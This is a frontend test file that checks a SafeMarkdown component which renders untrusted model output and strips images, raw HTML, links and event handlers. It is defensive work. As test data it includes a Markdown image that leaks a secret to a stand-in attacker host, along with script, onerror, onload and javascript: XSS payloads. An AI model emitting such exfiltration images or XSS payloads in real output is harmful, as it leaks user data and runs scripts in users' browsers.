// @vitest-environment jsdom
import "@testing-library/jest-dom/vitest";
import { afterEach, describe, expect, it } from "vitest";
import { cleanup, render } from "@testing-library/react";
import SafeMarkdown from "./SafeMarkdown";

afterEach(cleanup);

function html(md: string) {
  const { container } = render(<SafeMarkdown>{md}</SafeMarkdown>);
  return container;
}

describe("SafeMarkdown (D-03: untrusted model output)", () => {
  it("renders ordinary Markdown", () => {
    const c = html("# Title\n\n**bold** and `code`\n\n- one\n- two");
    expect(c.querySelector("h1")).toHaveTextContent("Title");
    expect(c.querySelector("strong")).toHaveTextContent("bold");
    expect(c.querySelector("code")).toHaveTextContent("code");
    expect(c.querySelectorAll("li")).toHaveLength(2);
  });

  it("never renders an <img>, so no request is made (exfiltration image)", () => {
    const c = html(
      "![secret](https://evil.example/leak?d=SECRET)\n\n<img src=x onerror=alert(1)>",
    );
    expect(c.querySelector("img")).toBeNull();
    expect(c.innerHTML).not.toContain("evil.example");
    expect(c.innerHTML).not.toContain("onerror");
    expect(c.querySelector("[data-testid=blocked-image]")).toHaveTextContent(
      "[secret]",
    );
  });

  it("drops raw HTML instead of parsing it", () => {
    const c = html(
      '<script>alert(1)</script><iframe src="https://evil"></iframe><b onclick="x()">hi</b><style>*{}</style>',
    );
    expect(c.querySelector("script")).toBeNull();
    expect(c.querySelector("iframe")).toBeNull();
    expect(c.querySelector("style")).toBeNull();
    expect(c.querySelector("b")).toBeNull();
    expect(c.innerHTML).not.toContain("onclick");
  });

  it("neutralises links: no anchor, URL shown as plain text", () => {
    const c = html("[click me](https://example.com/page)");
    expect(c.querySelector("a")).toBeNull();
    const link = c.querySelector("[data-testid=neutral-link]")!;
    expect(link).toHaveTextContent("click me");
    expect(link).toHaveTextContent("https://example.com/page");
  });

  it("javascript: and data: links produce no anchor and no live URL", () => {
    const c = html(
      "[a](javascript:alert(1)) [b](data:text/html;base64,PHNjcmlwdD4=) [c](vbscript:x)",
    );
    expect(c.querySelector("a")).toBeNull();
    expect(c.innerHTML).not.toContain("javascript:");
    expect(c.innerHTML).not.toContain("data:text");
    expect(c.innerHTML).not.toContain("vbscript:");
  });

  it("reference-style and autolinks are neutralised too", () => {
    const c = html(
      "<https://auto.example>\n\nsee [ref]\n\n[ref]: https://ref.example",
    );
    expect(c.querySelector("a")).toBeNull();
    expect(c.querySelector("img")).toBeNull();
  });

  it("no element carries src/href/srcset or an event handler attribute", () => {
    const c = html(
      "![x](http://a/b.png) [y](http://a/c) <a href='http://a'>z</a> <svg onload=1></svg> <video src=http://a></video>",
    );
    for (const el of Array.from(c.querySelectorAll("*"))) {
      for (const attr of Array.from(el.attributes)) {
        expect(attr.name).not.toMatch(/^(src|href|srcset|on.*)$/i);
      }
    }
  });
});
